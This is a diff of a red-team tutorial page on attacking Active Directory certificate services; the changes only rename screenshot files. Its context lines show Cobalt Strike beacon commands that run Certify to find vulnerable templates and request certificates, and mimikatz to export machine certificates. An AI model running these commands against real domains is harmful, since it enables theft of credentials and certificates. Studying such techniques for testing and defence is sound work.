@@ -90,7 +90,7 @@ _**Misconfigurations**_ within these templates can be <mark style="color:$danger
 beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable
 ```
 
-<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
 #### Key parts of this output
 
@@ -230,7 +230,7 @@ This does not rely on any vulnerable templates.
 
 **User certificates that have already been issued can be found in the user's Personal Certificate Store:**
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **If we have a&#x20;**<mark style="color:yellow;">**Beacon running on their machine**</mark>**,&#x20;**<mark style="color:$success;">**we can enumerate their certificates with Seatbelt**</mark>**:**
 
@@ -339,7 +339,7 @@ beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe reques
 
 **The same can be applied to computer accounts, but we must elevate to extract those certificates:**
 
-<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 beacon> mimikatz !crypto::certificates /systemstore:local_machine /export
